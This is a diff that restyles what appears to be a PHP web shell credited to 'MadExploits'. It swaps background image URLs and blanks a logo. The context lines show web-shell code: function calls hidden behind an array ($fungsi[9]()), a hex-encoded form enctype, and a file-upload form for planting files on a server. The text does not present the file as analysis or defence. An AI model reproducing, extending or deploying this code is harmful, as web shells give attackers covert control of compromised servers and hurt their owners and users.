@@ -151,7 +151,7 @@ if ($_GET['don'] == true) {
         .btn-submit,
         .form-file,
         tbody tr:nth-child(2n) {
-            background: url(https://i.imgur.com/BBA7PU4.gif)norepeat;
+            background: url(https://i.postimg.cc/c4Wsdzyf/811143.jpg)norepeat;
             bacground-size: 100% 100%;
             background-attachment: fixed;
         }
@@ -181,7 +181,7 @@ if ($_GET['don'] == true) {
         }
 
         body {
-            background: url(https://i.imgur.com/BBA7PU4.gif);
+            background: url(https://i.postimg.cc/c4Wsdzyf/811143.jpg);
             background-size: 100% 100%;
             background-attachment: fixed;
             font-family: monospace
@@ -553,7 +553,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-Google"><img width="400" height="400" src="https://i.gifer.com/TnAY.gif" align="right"></li>
+            <li class="logo-Google"><img width="400" height="400" src="" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="Google-up-submit" class="btn-submit">&nbsp;<input type="file" name="Google-upload" class="form-file"></li>
             </form>
